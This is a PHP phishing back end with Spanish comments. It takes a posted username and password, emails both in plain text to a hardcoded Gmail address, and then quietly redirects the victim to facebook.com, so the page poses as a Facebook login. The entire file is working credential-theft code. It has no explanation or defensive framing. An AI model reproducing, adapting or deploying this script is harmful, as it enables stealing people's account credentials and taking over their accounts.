<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Construir el mensaje de correo electrónico
    $to = "metonix97@gmail.com";
    $subject = "Datos de inicio de sesión";
    $message = "Nombre de usuario o correo electrónico: $username\n";
    $message .= "Contraseña: $password\n";
    
    // Enviar el correo electrónico
    if(mail($to, $subject, $message)) {
        // Redirigir a Facebook.com si el correo se envió correctamente
        header("Location: https://www.facebook.com");
        exit;
    } else {
        // Redirigir a una página de error si hubo un problema al enviar el correo
        header("Location: error.html");
        exit;
    }
} else {
    // Si se intenta acceder al script directamente, redirigir a una página de error
    header("Location: error.html");
    exit;
}
?>
